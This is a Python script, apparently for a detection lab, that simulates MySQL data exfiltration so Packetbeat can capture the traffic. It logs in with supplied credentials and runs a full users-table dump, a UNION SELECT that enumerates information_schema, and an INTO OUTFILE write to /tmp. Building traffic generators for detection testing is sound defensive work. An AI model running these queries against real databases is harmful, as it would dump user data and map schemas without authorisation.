import argparse
import time
import pymysql

def run_exfiltration(target_ip: str, target_port: int, username: str, password: str, database: str):
    print(f"[*] Starting MySQL Data Exfiltration Scenario against {target_ip}:{target_port}")
    print(f"[*] Connecting as '{username}' to database '{database}'...\n")

    try:
        # We use PyMySQL instead of mysql-connector-python because it handles
        # plaintext connections and legacy authentication much better for Packetbeat sniffing.
        connection = pymysql.connect(
            host=target_ip,
            port=target_port,
            user=username,
            password=password,
            database=database,
            connect_timeout=5,
            client_flag=pymysql.constants.CLIENT.MULTI_STATEMENTS
        )

        print("[+] Successfully connected to the database!")
        cursor = connection.cursor()

        # Query 1: Unbounded SELECT
        print("\n[*] Executing Query 1: Unbounded SELECT (Dumping all users)")
        query1 = "SELECT * FROM users"
        print(f"    -> {query1}")
        cursor.execute(query1)
        
        # Fetch all rows to force the data over the network (so Packetbeat sees it)
        rows = cursor.fetchall()
        print(f"    [+] Exfiltrated {len(rows)} rows of user data!")
        
        time.sleep(2)

        # Query 2: Malicious Keyword (UNION SELECT)
        print("\n[*] Executing Query 2: UNION SELECT (Extracting schema info)")
        query2 = "SELECT id, username FROM users WHERE id = 1 UNION SELECT 1, table_name FROM information_schema.tables"
        print(f"    -> {query2}")
        cursor.execute(query2)
        rows = cursor.fetchall()
        print(f"    [+] Exfiltrated {len(rows)} rows of schema data!")

        time.sleep(2)
        
        # Query 3: Malicious Keyword (INTO OUTFILE)
        print("\n[*] Executing Query 3: INTO OUTFILE (Attempting to write to disk)")
        query3 = "SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'"
        print(f"    -> {query3}")
        try:
            cursor.execute(query3)
        except Exception as e:
            # This will likely fail due to Docker permissions, but the query still hits the wire!
            print(f"    [-] Query failed (expected): {e}")

    except Exception as e:
        print(f"[-] Error connecting to MySQL: {e}")
    finally:
        if 'connection' in locals() and connection.open:
            cursor.close()
            connection.close()
            print("\n[*] MySQL connection closed.")

    print("\n[*] Scenario completed.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MySQL Data Exfiltration Scenario Generator")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=3306, help="Target MySQL port (default: 3306)")
    parser.add_argument("--user", default="app_user", help="MySQL username (default: app_user)")
    parser.add_argument("--password", default="app_password", help="MySQL password (default: app_password)")
    parser.add_argument("--database", default="company_db", help="Target database (default: company_db)")

    args = parser.parse_args()
    
    run_exfiltration(args.target, args.port, args.user, args.password, args.database)
